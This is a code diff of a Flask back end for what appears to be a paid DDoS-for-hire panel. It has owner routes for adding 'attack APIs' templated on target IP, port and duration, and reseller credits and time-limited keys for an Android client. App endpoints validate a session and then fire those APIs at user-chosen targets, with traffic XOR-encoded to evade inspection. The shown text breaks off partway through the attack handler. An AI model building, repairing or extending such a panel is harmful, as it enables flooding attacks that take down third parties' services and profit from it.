-    """Get all configured attack APIs"""
-    if attack_apis_col is None:
-        return jsonify([])
-    apis = list(attack_apis_col.find({}, {'_id': 0}).sort('priority', 1))
-    return jsonify(apis)
-
-@app.route('/api/attack-apis/add', methods=['POST'])
-@login_required
-@owner_required
-def add_attack_api():
-    """
-    Add a new attack API.
-    Body: {"name": "MyAPI", "url": "https://api.com/attack?target={ip}&port={port}&time={time}&key=ABC", "priority": 1}
-    
-    URL mein {ip}, {port}, {time} placeholder use karo.
-    """
-    if attack_apis_col is None:
-        return jsonify({'error': 'Database not configured'}), 503
-    
-    data = request.json or {}
-    name = data.get('name', '').strip()
-    url = data.get('url', '').strip()
-    priority = int(data.get('priority', 1))
-    
-    if not name or not url:
-        return jsonify({'error': 'name and url required'}), 400
-    if '{ip}' not in url or '{port}' not in url or '{time}' not in url:
-        return jsonify({'error': 'URL must contain {ip}, {port}, {time} placeholders'}), 400
-    
-    api_id = secrets.token_hex(8)
-    attack_apis_col.insert_one({
-        'id': api_id,
-        'name': name,
-        'url': url,
-        'priority': priority,
-        'enabled': True,
-        'added_at': datetime.utcnow().isoformat() + 'Z'
-    })
-    return jsonify({'status': 'success', 'id': api_id})
-
-@app.route('/api/attack-apis/update', methods=['POST'])
-@login_required
-@owner_required
-def update_attack_api():
-    """Update an existing API (enable/disable, change URL, priority)"""
-    if attack_apis_col is None:
-        return jsonify({'error': 'Database not configured'}), 503
-    data = request.json or {}
-    api_id = data.get('id', '').strip()
-    if not api_id:
-        return jsonify({'error': 'id required'}), 400
-    
-    updates = {}
-    if 'url' in data:
-        updates['url'] = data['url'].strip()
-    if 'name' in data:
-        updates['name'] = data['name'].strip()
-    if 'priority' in data:
-        updates['priority'] = int(data['priority'])
-    if 'enabled' in data:
-        updates['enabled'] = bool(data['enabled'])
-    
-    if updates:
-        attack_apis_col.update_one({'id': api_id}, {'$set': updates})
-    return jsonify({'status': 'success'})
-
-@app.route('/api/attack-apis/delete', methods=['POST'])
-@login_required
-@owner_required
-def delete_attack_api():
-    """Delete an API"""
-    if attack_apis_col is None:
-        return jsonify({'error': 'Database not configured'}), 503
-    data = request.json or {}
-    api_id = data.get('id', '').strip()
-    if not api_id:
-        return jsonify({'error': 'id required'}), 400
-    attack_apis_col.delete_one({'id': api_id})
-    return jsonify({'status': 'success'})
-
-@app.route('/api/attack-apis/test', methods=['POST'])
-@login_required
-@owner_required
-def test_attack_api():
-    """Test an API with dummy values (1.1.1.1:80 for 1 second)"""
-    data = request.json or {}
-    url_template = data.get('url', '').strip()
-    if not url_template:
-        return jsonify({'error': 'url required'}), 400
-    
-    try:
-        url = url_template.replace('{ip}', '1.1.1.1').replace('{port}', '80').replace('{time}', '1')
-        r = requests.get(url, timeout=10)
-        return jsonify({
-            'status': 'success' if r.status_code == 200 else 'failed',
-            'http_code': r.status_code,
-            'response': r.text[:500]
-        })
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-
 @app.route('/api/add-credits', methods=['POST'])
 @login_required
 @owner_required
@@ -1578,6 +1373,7 @@ def api_delete_reseller():
     delete_reseller_by_username(username)
     return jsonify({'status': 'success'})
 
+
 @app.route('/api/generate', methods=['POST'])
 @login_required
 def api_generate():
@@ -1590,16 +1386,14 @@ def api_generate():
     if duration_value <= 0 or device_limit <= 0:
         return jsonify({'error': 'Invalid values'}), 400
 
-    # Credit check for resellers
     if is_reseller():
-        # Convert to hours for credit calc
         if duration_unit == 'minutes':
             hours = max(1, duration_value // 60) if duration_value >= 60 else 1
         elif duration_unit == 'days':
             hours = duration_value * 24
         else:
             hours = duration_value
-        cost = hours * CREDITS_PER_HOUR * device_limit  # charge per device
+        cost = hours * CREDITS_PER_HOUR * device_limit
         r = find_reseller(session['username'])
         if not r:
             return jsonify({'error': 'Reseller not found'}), 400
@@ -1611,8 +1405,6 @@ def api_generate():
     new_key = f"{prefix}-{secrets.token_urlsafe(10)}"
     created_at = datetime.utcnow()
 
-    # Single device key: expiry starts on redeem
-    # Multi device key: expiry starts immediately (like before)
     if device_limit == 1:
         expires_at_val = None
         redeemed = False
@@ -1642,10 +1434,7 @@ def api_generate():
     }
 
     save_key(record.copy())
-
-    # Save to history
     save_history_record(record.copy())
-
     return jsonify(record)
 
 @app.route('/api/delete-key', methods=['POST'])
@@ -1653,7 +1442,6 @@ def api_generate():
 def api_delete_key():
     data = request.json or {}
     key_id = data.get('id', '')
-    # Permission check — resellers can delete only their own keys
     if is_reseller():
         key = keys_col.find_one({'id': key_id}, {'_id': 0})
         if not key or key.get('generated_by') != session.get('username'):
@@ -1668,7 +1456,7 @@ def api_delete_key():
 @app.route('/api/remove-device', methods=['POST'])
 @login_required
 def api_remove_device():
-    """Remove (unlock) a device from a key so the user can re-login from a different device."""
+    """Remove (unlock) a device from a key."""
     data = request.json or {}
     key_id = data.get('id', '')
     device_id = data.get('device_id', '')
@@ -1679,7 +1467,6 @@ def api_remove_device():
     if not key:
         return jsonify({'error': 'Key not found'}), 404
 
-    # Permission — owners can do anything; resellers only on their own keys
     if is_reseller() and key.get('generated_by') != session.get('username'):
         return jsonify({'error': 'Permission denied'}), 403
 
@@ -1690,7 +1477,6 @@ def api_remove_device():
     devices_info.pop(device_id, None)
     update_key(key_id, {'locked_device_ids': locked, 'devices_info': devices_info})
 
-    # Also clean from connections
     connections = load_connections()
     if key_id in connections:
         connections[key_id] = [c for c in connections[key_id] if c.get('device_id') != device_id]
@@ -1699,9 +1485,9 @@ def api_remove_device():
     return jsonify({'status': 'success', 'remaining_devices': len(locked)})
 
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 # KEY EXTEND — add more time to existing keys
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
 
 def _to_minutes(value, unit):
     """Convert a duration value/unit pair into minutes."""
@@ -1710,18 +1496,11 @@ def _to_minutes(value, unit):
         return value
     if unit == 'hours':
         return value * 60
-    # days
     return value * 60 * 24
 
 
 def _extend_single_key(key, add_minutes):
-    """
-    Extend a single key record by add_minutes.
-    - Redeemed key (has expires_at): extend from current expiry, or from now if already expired.
-    - Unredeemed key (expires_at is None): grow its stored duration so the user gets
-      more time whenever they redeem.
-    Returns the updates dict that was applied.
-    """
+    """Extend a single key record by add_minutes."""
     now = datetime.utcnow()
     if key.get('expires_at'):
         try:
@@ -1732,7 +1511,6 @@ def _extend_single_key(key, add_minutes):
         new_expiry = (base + timedelta(minutes=add_minutes)).isoformat() + 'Z'
         updates = {'expires_at': new_expiry}
     else:
-        # Pending/unredeemed single-device key — bump stored duration (store in minutes)
         existing = _to_minutes(key.get('duration_value', 0), key.get('duration_unit', 'hours'))
         total = existing + add_minutes
         updates = {'duration_value': total, 'duration_unit': 'minutes'}
@@ -1743,7 +1521,7 @@ def _extend_single_key(key, add_minutes):
 @app.route('/api/extend-key', methods=['POST'])
 @login_required
 def api_extend_key():
-    """Extend the time of a single key (owner: any of their own keys; reseller: own keys)."""
+    """Extend the time of a single key."""
     data = request.json or {}
     key_id = data.get('id', '')
     try:
@@ -1758,15 +1536,13 @@ def api_extend_key():
     if not key:
         return jsonify({'error': 'Key not found'}), 404
 
-    # Permission — resellers can extend only their own keys
     if is_reseller() and key.get('generated_by') != session.get('username'):
         return jsonify({'error': 'Permission denied'}), 403
 
     add_minutes = _to_minutes(amount, unit)
 
-    # Charge resellers credits for the added time (per device, same rate as generate)
     if is_reseller():
-        hours = max(1, (add_minutes + 59) // 60)  # round up to next hour
+        hours = max(1, (add_minutes + 59) // 60)
         device_limit = key.get('device_limit', 1)
         cost = hours * CREDITS_PER_HOUR * device_limit
         r = find_reseller(session['username'])
@@ -1783,11 +1559,7 @@ def api_extend_key():
 @app.route('/api/extend-all', methods=['POST'])
 @login_required
 def api_extend_all():
-    """
-    Extend time for ALL keys belonging to the requester.
-    - Reseller: all of their own keys (charged credits for the total added time).
-    - Owner: their own keys; optionally a specific reseller's keys via 'username'.
-    """
+    """Extend time for ALL keys belonging to the requester."""
     data = request.json or {}
     try:
         amount = int(data.get('amount', 0))
@@ -1812,7 +1584,6 @@ def api_extend_all():
     if not target_keys:
         return jsonify({'status': 'success', 'extended': 0})
 
-    # Charge resellers for total added time across all their keys
     if is_reseller():
         hours = max(1, (add_minutes + 59) // 60)
         total_devices = sum(k.get('device_limit', 1) for k in target_keys)
@@ -1830,154 +1601,26 @@ def api_extend_all():
     return jsonify({'status': 'success', 'extended': len(target_keys)})
 
 
-# ══════════════════════════════════════════════════════════════════
-# /api/handshake — ECDH Key Exchange for Encrypted Channel
-# App sends its public key, panel sends its public key back
-# Both derive shared secret without it ever being transmitted
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+# 3-STEP CHALLENGE-RESPONSE HANDSHAKE — /connect/init, /connect/verify, /connect/action
+# NO secrets hardcoded in the app. Security comes from:
+# 1. Server generates random challenge → binds to device
+# 2. App proves it received the challenge (SHA256(challenge + device_id))
+# 3. Server verifies proof → issues session token
+# Without the real key being valid, no challenge is issued.
+# Without receiving the challenge, no valid proof can be made.
+# ═══════════════════════════════════════════════════════════════════
 
-from cryptography.hazmat.primitives.asymmetric import ec
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.backends import default_backend
-
-# Store active sessions: session_id -> {shared_key, device_id, created_at}
-_ecdh_sessions = {}
-
-@app.route('/api/handshake', methods=['POST'])
-def api_handshake():
-    """ECDH Key Exchange — establishes encrypted channel with app"""
-    # Rate limit handshake too
-    ip = get_client_ip() or 'unknown'
-    allowed, retry_after = api_check_rate(ip)
-    if not allowed:
-        return jsonify({'success': False, 'message': f'Rate limited. Try after {retry_after}s'}), 429
-    api_record_request(ip)
-    data = request.json or {}
+@app.route('/connect/init', methods=['POST'])
+def connect_init():
+    """
+    STEP 1: App sends encrypted(key + device_id) → Panel decodes → validates key → returns challenge blob.
+    The challenge is 32 random bytes stored in MongoDB with 30s TTL.
+    Both request and response are XOR-encoded (not readable in HTTP Canary).
+    """
+    data = get_decoded_request()
+    key_value = data.get('key', '').strip()
     device_id = data.get('device_id', '').strip()
-    client_pub_key_b64 = data.get('public_key', '').strip()
-    
-    if not device_id or not client_pub_key_b64:
-        return jsonify({'success': False, 'message': 'Missing device_id or public_key'}), 400
-    
-    try:
-        # Decode client's public key
-        client_pub_key_bytes = base64.b64decode(client_pub_key_b64)
-        client_pub_key = serialization.load_der_public_key(client_pub_key_bytes, backend=default_backend())
-        
-        # Generate server's ECDH keypair
-        server_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
-        server_public_key = server_private_key.public_key()
-        
-        # Derive shared secret
-        shared_key = server_private_key.exchange(ec.ECDH(), client_pub_key)
-        
-        # Create session
-        session_id = secrets.token_urlsafe(32)
-        _ecdh_sessions[session_id] = {
-            'shared_key': shared_key.hex(),
-            'device_id': device_id,
-            'created_at': datetime.utcnow().isoformat() + 'Z'
-        }
-        
-        # Cleanup old sessions (keep max 1000)
-        if len(_ecdh_sessions) > 1000:
-            oldest_keys = sorted(_ecdh_sessions.keys(), 
-                               key=lambda k: _ecdh_sessions[k]['created_at'])[:500]
-            for k in oldest_keys:
-                _ecdh_sessions.pop(k, None)
-        
-        # Encode server's public key
-        server_pub_key_bytes = server_public_key.public_bytes(
-            serialization.Encoding.DER,
-            serialization.PublicFormat.SubjectPublicKeyInfo
-        )
-        server_pub_key_b64 = base64.b64encode(server_pub_key_bytes).decode('utf-8')
-        
-        return jsonify({
-            'success': True,
-            'server_public_key': server_pub_key_b64,
-            'session_id': session_id
-        })
-        
-    except Exception as e:
-        return jsonify({'success': False, 'message': f'Handshake failed: {str(e)}'}), 400
-
-
-# ══════════════════════════════════════════════════════════════════
-# /connect — APP ENDPOINT (supports both encrypted and plain)
-# ══════════════════════════════════════════════════════════════════
-
-@app.route('/connect', methods=['POST'])
-def connect_device():
-    # ── ANTI-DDOS: Rate limit + request validation ──
-    ip = get_client_ip() or 'unknown'
-    allowed, retry_after = api_check_rate(ip)
-    if not allowed:
-        return jsonify({'valid': False, 'message': f'Rate limited. Try after {retry_after}s'}), 429
-    api_record_request(ip)
-    
-    # Validate request looks like it came from our app
-    is_valid_req, err_msg = validate_app_request()
-    if not is_valid_req:
-        return jsonify({'valid': False, 'message': 'Bad request'}), 400
-
-    # Try to decrypt incoming request
-    raw_body = request.get_data()
-    data = None
-    
-    content_type = request.headers.get('Content-Type', '')
-    session_id = request.headers.get('X-Session', '').strip()
-    
-    if ('application/octet-stream' in content_type or request.headers.get('X-Encrypted') == '1') and session_id:
-        # ECDH encrypted request — use session's shared key (NO hardcoded key)
-        try:
-            session_data = _ecdh_sessions.get(session_id)
-            if not session_data:
-                # Session expired — try to parse as plain JSON
-                try:
-                    data = json.loads(raw_body.decode('utf-8'))
-                except Exception:
-                    return jsonify({'valid': False, 'message': 'Session expired. Please re-login.'})
-            
-            shared_key_bytes = bytes.fromhex(session_data['shared_key'])[:16]  # Use first 16 bytes as AES key
-            encrypted_data = base64.b64decode(raw_body)
-            iv = encrypted_data[:16]
-            ct = encrypted_data[16:]
-            cipher = AES.new(shared_key_bytes, AES.MODE_CBC, iv)
-            from Crypto.Util.Padding import unpad
-            plaintext = unpad(cipher.decrypt(ct), AES.block_size)
-            data = json.loads(plaintext.decode('utf-8'))
-        except Exception as e:
-            # Try with static AES_KEY as fallback (old app versions)
-            try:
-                encrypted_data = base64.b64decode(raw_body)
-                iv = encrypted_data[:16]
-                ct = encrypted_data[16:]
-                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-                from Crypto.Util.Padding import unpad
-                plaintext = unpad(cipher.decrypt(ct), AES.block_size)
-                data = json.loads(plaintext.decode('utf-8'))
-            except Exception:
-                return encrypted_reply({'valid': False, 'message': 'Decryption failed'})
-    elif 'application/octet-stream' in content_type or request.headers.get('X-Encrypted') == '1':
-        # Old AES encrypted (static key)
-        try:
-            encrypted_data = base64.b64decode(raw_body)
-            iv = encrypted_data[:16]
-            ct = encrypted_data[16:]
-            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-            from Crypto.Util.Padding import unpad
-            plaintext = unpad(cipher.decrypt(ct), AES.block_size)
-            data = json.loads(plaintext.decode('utf-8'))
-        except Exception:
-            return encrypted_reply({'valid': False, 'message': 'Decryption failed'})
-    else:
-        # Plain JSON (backward compat)
-        data = request.json or {}
-    
-    key = data.get('key', '').strip()
-    device_id = data.get('device_id', '').strip()
-    device_name = data.get('device_name', 'Unknown')[:100].strip()
     device_model = data.get('device_model', '')[:100].strip()
     android_version = data.get('android_version', '')[:50].strip()
     battery_level = data.get('battery_level', '')
@@ -1985,22 +1628,19 @@ def connect_device():
         battery_level = str(int(battery_level))
     else:
         battery_level = str(battery_level).strip()[:10]
-    action = data.get('action', '').strip()
 
-    if not key:
-        return encrypted_reply({'valid': False, 'message': 'Key is required'})
+    if not key_value:
+        return make_encoded_response({'valid': False, 'message': 'Key is required'})
     if not device_id:
-        return encrypted_reply({'valid': False, 'message': 'Device ID is required'})
-    if keys_col is None:
-        return encrypted_reply({'valid': False, 'message': 'Database not configured'})
+        return make_encoded_response({'valid': False, 'message': 'Device ID is required'})
 
-    found_key = find_key_by_value(key)
+    # Validate key exists and is not expired
+    found_key = find_key_by_value(key_value)
     if not found_key:
-        return encrypted_reply({'valid': False, 'message': 'Invalid key'})
+        return make_encoded_response({'valid': False, 'message': 'Invalid key'})
 
-    # --- Expiry on first redeem (only for single device keys) ---
+    # --- Expiry on first redeem (single device keys) ---
     if found_key.get('device_limit', 1) == 1 and (not found_key.get('redeemed') or not found_key.get('expires_at')):
-        # Single device key — start expiry timer NOW on first redeem
         now = datetime.utcnow()
         duration_value = found_key.get('duration_value', 1)
         duration_unit = found_key.get('duration_unit', 'hours')
@@ -2013,22 +1653,33 @@ def connect_device():
         found_key['expires_at'] = expires_at.isoformat() + 'Z'
         found_key['redeemed'] = True
         found_key['redeemed_at'] = now.isoformat() + 'Z'
-        update_key(found_key['id'], {'expires_at': found_key['expires_at'], 'redeemed': True, 'redeemed_at': found_key['redeemed_at']})
+        update_key(found_key['id'], {
+            'expires_at': found_key['expires_at'],
+            'redeemed': True,
+            'redeemed_at': found_key['redeemed_at']
+        })
 
-    expires_at = datetime.fromisoformat(found_key['expires_at'].replace('Z', '+00:00'))
-    if datetime.utcnow().replace(tzinfo=None) > expires_at.replace(tzinfo=None):
-        return encrypted_reply({'valid': False, 'message': 'Key has expired'})
+    # Check expiry
+    if found_key.get('expires_at'):
+        expires_at_dt = datetime.fromisoformat(found_key['expires_at'].replace('Z', '+00:00'))
+        if datetime.utcnow().replace(tzinfo=None) > expires_at_dt.replace(tzinfo=None):
+            return make_encoded_response({'valid': False, 'message': 'Key has expired'})
 
+    # Check device limit
     device_limit = found_key.get('device_limit', 1)
     locked_devices = found_key.get('locked_device_ids') or []
-    plan = found_key.get('plan', 'Premium')
+    if device_id not in locked_devices and len(locked_devices) >= device_limit:
+        return make_encoded_response({
+            'valid': False,
+            'message': f'Device limit reached ({len(locked_devices)}/{device_limit})'
+        })
 
-    # --- Store device info (model, android version, last_seen) ---
+    # --- Store device info ---
     devices_info = found_key.get('devices_info', {})
     now_iso = datetime.utcnow().isoformat() + 'Z'
     if device_id not in devices_info:
         devices_info[device_id] = {
-            'model': device_model or device_name,
+            'model': device_model or 'Unknown',
             'android_version': android_version,
             'battery_level': battery_level,
             'first_seen': now_iso,
@@ -2036,145 +1687,443 @@ def connect_device():
             'ip_address': get_client_ip(),
         }
     else:
-        # Update model/version if provided
         if device_model:
             devices_info[device_id]['model'] = device_model
         if android_version:
             devices_info[device_id]['android_version'] = android_version
-        # Always update battery, last_seen + IP
         if battery_level:
             devices_info[device_id]['battery_level'] = battery_level
         devices_info[device_id]['last_seen'] = now_iso
         devices_info[device_id]['ip_address'] = get_client_ip()
 
+    # Lock device if not already
     if device_id not in locked_devices:
-        if len(locked_devices) >= device_limit:
-            return encrypted_reply({'valid': False, 'message': f'Device limit reached ({len(locked_devices)}/{device_limit})'})
         locked_devices.append(device_id)
         update_key(found_key['id'], {'locked_device_ids': locked_devices, 'devices_info': devices_info})
+        # Save connection record
         connections = load_connections()
         key_id = found_key.get('id')
         connections.setdefault(key_id, [])
-        connections[key_id].append({'connection_id': secrets.token_urlsafe(16), 'device_id': device_id, 'device_name': device_name, 'device_model': device_model, 'android_version': android_version, 'ip_address': get_client_ip(), 'connected_at': datetime.utcnow().isoformat()+'Z', 'status': 'approved'})
+        connections[key_id].append({
+            'connection_id': secrets.token_urlsafe(16),
+            'device_id': device_id,
+            'device_model': device_model,
+            'android_version': android_version,
+            'ip_address': get_client_ip(),
+            'connected_at': now_iso,
+            'status': 'approved'
+        })
         save_connections(connections)
     else:
         update_key(found_key['id'], {'devices_info': devices_info})
 
-    if action == 'status':
-        return encrypted_reply({'valid': True, 'action': 'status', 'data': proxy_status()})
+    # --- Generate Challenge ---
+    challenge_bytes = os.urandom(32)
+    challenge_id = secrets.token_hex(16)
+    now_dt = datetime.utcnow()
+    expires_at_challenge = now_dt + timedelta(seconds=30)
 
-    if action == 'attack':
-        target_ip = data.get('ip', '').strip()
-        target_port = data.get('port', '').strip()
-        attack_time = data.get('time', '').strip()
-        if not target_ip or not target_port or not attack_time:
-            return encrypted_reply({'valid': False, 'message': 'Missing attack params'})
-        return encrypted_reply({'valid': True, 'action': 'attack', 'data': proxy_attack(target_ip, target_port, attack_time)})
-
-    # Default: key verify
-    connections = load_connections()
-    key_id = found_key.get('id')
-    connections.setdefault(key_id, [])
-    existing = next((d for d in connections[key_id] if d.get('device_id') == device_id), None)
-    if not existing:
-        connections[key_id].append({'connection_id': secrets.token_urlsafe(16), 'device_id': device_id, 'device_name': device_name, 'device_model': device_model, 'android_version': android_version, 'ip_address': get_client_ip(), 'connected_at': datetime.utcnow().isoformat()+'Z', 'status': 'approved'})
-        save_connections(connections)
-
-    return encrypted_reply({'valid': True, 'message': 'Access granted', 'expires_at': found_key.get('expires_at'), 'plan': plan, 'max_devices': device_limit, 'sig': sign_response(found_key.get('expires_at'), device_id)})
-
-
-# ══════════════════════════════════════════════════════════════════
-# APP UPDATE SYSTEM — APK upload + in-app update
-# ══════════════════════════════════════════════════════════════════
-
-UPLOAD_FOLDER = "uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-
-@app.route('/api/check-update', methods=['POST'])
-def check_update():
-    """App calls this with its current versionCode. Returns update info if newer version available."""
-    data = request.json or {}
-    current_version = int(data.get('version_code', 0))
-    config = load_update_config()
-    latest_version = config.get('latest_version_code', 1)
-    if current_version < latest_version and config.get('apk_filename'):
-        return jsonify({
-            'update_available': True,
-            'latest_version_code': latest_version,
-            'latest_version_name': config.get('latest_version_name', '1.0'),
-            'download_url': f"/download-apk/{config['apk_filename']}",
-            'changelog': config.get('changelog', '')
-        })
-    return jsonify({'update_available': False})
-
-@app.route('/download-apk/<filename>')
-def download_apk(filename):
-    """Serve the uploaded APK file for in-app download."""
-    filepath = os.path.join(UPLOAD_FOLDER, filename)
-    if not os.path.exists(filepath):
-        return "File not found", 404
-    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True, mimetype='application/vnd.android.package-archive')
-
-@app.route('/api/update-config', methods=['GET'])
-@login_required
-@owner_required
-def get_update_config():
-    config = load_update_config()
-    config['has_apk'] = bool(config.get('apk_filename') and os.path.exists(os.path.join(UPLOAD_FOLDER, config.get('apk_filename', ''))))
-    return jsonify(config)
-
-@app.route('/api/upload-apk', methods=['POST'])
-@login_required
-@owner_required
-def upload_apk():
-    """Upload new APK + set version info."""
-    if 'apk_file' not in request.files:
-        return jsonify({'error': 'No APK file provided'}), 400
-    file = request.files['apk_file']
-    if not file.filename.endswith('.apk'):
-        return jsonify({'error': 'File must be .apk'}), 400
-
-    version_code = int(request.form.get('version_code', 1))
-    version_name = request.form.get('version_name', '1.0')
-    changelog = request.form.get('changelog', '')
-
-    # Save APK
-    filename = f"VISHAL PRO_v{version_code}.apk"
-    filepath = os.path.join(UPLOAD_FOLDER, filename)
-    file.save(filepath)
-
-    # Delete old APK if different
-    config = load_update_config()
-    old_file = config.get('apk_filename', '')
-    if old_file and old_file != filename:
-        old_path = os.path.join(UPLOAD_FOLDER, old_file)
-        if os.path.exists(old_path):
-            os.remove(old_path)
-
-    # Update config
-    config = {
-        'latest_version_code': version_code,
-        'latest_version_name': version_name,
-        'apk_filename': filename,
-        'changelog': changelog
+    challenge_doc = {
+        'challenge_id': challenge_id,
+        'challenge_bytes_b64': base64.b64encode(challenge_bytes).decode('utf-8'),
+        'key_value': key_value,
+        'device_id': device_id,
+        'created_at': now_dt,
+        'expires_at': expires_at_challenge,
+        'used': False
     }
-    save_update_config(config)
-    return jsonify({'status': 'success', 'filename': filename})
+    challenges_col.insert_one(challenge_doc)
+
+    # Return challenge to app (encoded)
+    return make_encoded_response({
+        'valid': True,
+        'challenge_id': challenge_id,
+        'challenge': base64.b64encode(challenge_bytes).decode('utf-8'),
+        'message': 'Challenge issued'
+    })
 
 
+@app.route('/connect/verify', methods=['POST'])
+def connect_verify():
+    """
+    STEP 3: App sends challenge_id + proof + device_id.
+    Panel re-computes SHA256(challenge_bytes + device_id_bytes) and compares.
+    If match → issue session token. If no match → reject (tampered).
+    
+    For action: "attack" — verify session then fire attack APIs.
+    """
+    data = get_decoded_request()
+    challenge_id = data.get('challenge_id', '').strip()
+    proof = data.get('proof', '').strip()
+    device_id = data.get('device_id', '').strip()
+    action = data.get('action', '').strip()
+
+    if not challenge_id or not proof or not device_id:
+        return make_encoded_response({'valid': False, 'message': 'Missing required fields'})
+
+    # Find challenge in MongoDB
+    challenge_doc = challenges_col.find_one({'challenge_id': challenge_id}, {'_id': 0})
+    if not challenge_doc:
+        return make_encoded_response({'valid': False, 'message': 'Challenge not found or expired'})
+
+    # Check: not expired?
+    expires_at = challenge_doc.get('expires_at')
+    if isinstance(expires_at, str):
+        expires_at = datetime.fromisoformat(expires_at.replace('Z', '+00:00')).replace(tzinfo=None)
+    if datetime.utcnow() > expires_at:
+        challenges_col.delete_one({'challenge_id': challenge_id})
+        return make_encoded_response({'valid': False, 'message': 'Challenge expired'})
+
+    # Check: not already used?
+    if challenge_doc.get('used'):
+        return make_encoded_response({'valid': False, 'message': 'Challenge already used'})
+
+    # Check: device_id matches?
+    if challenge_doc.get('device_id') != device_id:
+        return make_encoded_response({'valid': False, 'message': 'Device mismatch'})
+
+    # Re-compute proof: SHA256(challenge_bytes + device_id_bytes)
+    stored_challenge_bytes = base64.b64decode(challenge_doc['challenge_bytes_b64'])
+    device_id_bytes = device_id.encode('utf-8')
+    expected_hash = hashlib.sha256(stored_challenge_bytes + device_id_bytes).digest()
+    expected_proof = base64.b64encode(expected_hash).decode('utf-8')
+
+    # Compare proof (constant-time)
+    if not secrets.compare_digest(proof, expected_proof):
+        return make_encoded_response({'valid': False, 'message': 'Proof verification failed'})
+
+    # Mark challenge as used
+    challenges_col.update_one({'challenge_id': challenge_id}, {'$set': {'used': True}})
+
+    # Get the key info
+    key_value = challenge_doc.get('key_value')
+    found_key = find_key_by_value(key_value)
+    if not found_key:
+        return make_encoded_response({'valid': False, 'message': 'Key no longer valid'})
+
+    # Generate session token
+    session_token = secrets.token_hex(32)
+    now_dt = datetime.utcnow()
+
+    # Session expires when the key expires
+    key_expires_at = found_key.get('expires_at', '')
+    if key_expires_at:
+        session_expires = datetime.fromisoformat(key_expires_at.replace('Z', '+00:00')).replace(tzinfo=None)
+    else:
+        # Default: 24 hours if key has no expiry set
+        session_expires = now_dt + timedelta(hours=24)
+
+    session_doc = {
+        'token': session_token,
+        'key_value': key_value,
+        'device_id': device_id,
+        'expires_at': session_expires,
+        'created_at': now_dt,
+        'ip': get_client_ip()
+    }
+    sessions_col.insert_one(session_doc)
+
+    # Return session data to app (encoded)
+    return make_encoded_response({
+        'valid': True,
+        'message': 'Access granted',
+        'session_token': session_token,
+        'expires_at': found_key.get('expires_at', ''),
+        'plan': found_key.get('plan', 'Premium'),
+        'max_devices': found_key.get('device_limit', 1)
+    })
+
+
+@app.route('/connect/action', methods=['POST'])
+def connect_action():
+    """
+    STEP 4: App sends encrypted(session_token + device_id + action).
+    Panel decodes → validates session → processes action (attack/status).
+    Both request and response are XOR-encoded.
+    """
+    data = get_decoded_request()
+    session_token = data.get('session_token', '').strip()
+    device_id = data.get('device_id', '').strip()
+    action = data.get('action', '').strip()
+
+    if not session_token or not device_id:
+        return make_encoded_response({'valid': False, 'message': 'Missing session_token or device_id'})
+
+    # Validate session token in MongoDB
+    session_doc = sessions_col.find_one({'token': session_token}, {'_id': 0})
+    if not session_doc:
+        return make_encoded_response({'valid': False, 'message': 'Invalid session'})
+
+    # Check session expiry
+    session_expires = session_doc.get('expires_at')
+    if isinstance(session_expires, str):
+        session_expires = datetime.fromisoformat(session_expires.replace('Z', '+00:00')).replace(tzinfo=None)
+    if datetime.utcnow() > session_expires:
+        sessions_col.delete_one({'token': session_token})
+        return make_encoded_response({'valid': False, 'message': 'Session expired'})
+
+    # Check device matches
+    if session_doc.get('device_id') != device_id:
+        return make_encoded_response({'valid': False, 'message': 'Device mismatch'})
+
+    # Update device last_seen
+    key_value = session_doc.get('key_value')
+    found_key = find_key_by_value(key_value)
+    if found_key:
+        devices_info = found_key.get('devices_info', {})
+        now_iso = datetime.utcnow().isoformat() + 'Z'
+        if device_id in devices_info:
+            devices_info[device_id]['last_seen'] = now_iso
+            devices_info[device_id]['ip_address'] = get_client_ip()
+            battery = data.get('battery_level', '')
+            if battery:
+                devices_info[device_id]['battery_level'] = str(battery)[:10]
+            update_key(found_key['id'], {'devices_info': devices_info})
+
+    # Handle action
+    if action == 'attack':
+        return _handle_attack_from_session(data, found_key)
+    elif action == 'status':
+        if not found_key:
+            return make_encoded_response({'valid': False, 'message': 'Key no longer valid'})
+        # Check if key itself has expired
+        if found_key.get('expires_at'):
+            key_exp = datetime.fromisoformat(found_key['expires_at'].replace('Z', '+00:00')).replace(tzinfo=None)
+            if datetime.utcnow() > key_exp:
+                return make_encoded_response({'valid': False, 'message': 'Key has expired'})
+        return make_encoded_response({
+            'valid': True,
+            'message': 'Key is active',
+            'expires_at': found_key.get('expires_at', ''),
+            'plan': found_key.get('plan', 'Premium'),
+            'max_devices': found_key.get('device_limit', 1)
+        })
+    else:
+        # Default: return key status
+        if not found_key:
+            return make_encoded_response({'valid': False, 'message': 'Key no longer valid'})
+        return make_encoded_response({
+            'valid': True,
+            'message': 'Session active',
+            'expires_at': found_key.get('expires_at', ''),
+            'plan': found_key.get('plan', 'Premium'),
+            'max_devices': found_key.get('device_limit', 1)
+        })
+
+
+# ═══════════════════════════════════════════════════════════════════
+# ATTACK EXECUTION LOGIC
+# ═══════════════════════════════════════════════════════════════════
+
+def _fire_attack_api(api_config, host, port, time_val):
+    """Fire a single attack API. Replaces {ip},{port},{time} in the URL template."""
+    try:
+        url_template = api_config.get('url', '')
+        if not url_template:
+            return False, f'{api_config.get("name","?")} has no URL', 0
+
+        # Replace placeholders
+        url = url_template.replace('{ip}', host).replace('{port}', str(port)).replace('{time}', str(time_val))
+
+        timeout = api_config.get('timeout', 12)
+        resp = requests.get(url, timeout=timeout)
+
+        if resp.status_code == 200:
+            return True, f'Attack sent via {api_config["name"]}', resp.status_code
+        else:
+            return False, f'{api_config["name"]} returned {resp.status_code}', resp.status_code
+    except requests.exceptions.Timeout:
+        return False, f'{api_config["name"]} timed out', 0
+    except Exception as e:
+        return False, f'{api_config["name"]} error: {str(e)[:100]}', 0
+
+
+def _handle_attack_from_session(data, found_key):
+    """
+    Process an attack action from /connect/action — session already validated.
+    Priority logic:
+    - Priority 0 = fire ALL priority-0 APIs simultaneously (concurrent)
